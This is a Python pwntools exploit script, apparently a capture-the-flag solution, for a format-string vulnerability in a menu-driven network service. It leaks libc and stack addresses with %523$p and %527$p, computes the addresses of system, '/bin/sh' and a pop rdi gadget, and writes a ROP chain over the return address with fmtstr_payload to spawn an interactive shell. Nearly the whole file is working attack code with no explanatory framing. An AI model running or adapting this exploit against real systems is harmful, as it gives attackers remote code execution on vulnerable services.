#!/usr/bin/env python3

from pwn import *
import sys

context.log_level = "debug"
context.bits = 64

if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
	io = remote("localhost", 10001)

def input_fmt(payload):
    io.sendlineafter(b"> ", b"1")
    io.send(payload)

def run_fmt():
    io.sendlineafter(b"> ", b"2")

offset = 0x29d90
input_fmt(b"%523$p")
run_fmt()
io.recvuntil(b"prob: ")
libc_base = int(io.recvline(), 16) - offset
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678
pop_rdi = libc_base + 0x166d71
input_fmt(b"%527$p")
run_fmt()
io.recvuntil(b"prob: ")
ret = int(io.recvline(), 16) - 0x110

io.success(f"libc base @ {hex(libc_base)}")
io.success(f"ret @ {hex(ret)}")

payload = fmtstr_payload(8, {ret: pop_rdi+1})
input_fmt(payload)
run_fmt()
payload = fmtstr_payload(8, {ret+8: pop_rdi})
input_fmt(payload)
run_fmt()
payload = fmtstr_payload(8, {ret+16: binsh})
input_fmt(payload)
run_fmt()
payload = fmtstr_payload(8, {ret+24: system})
input_fmt(payload)
run_fmt()
io.interactive()
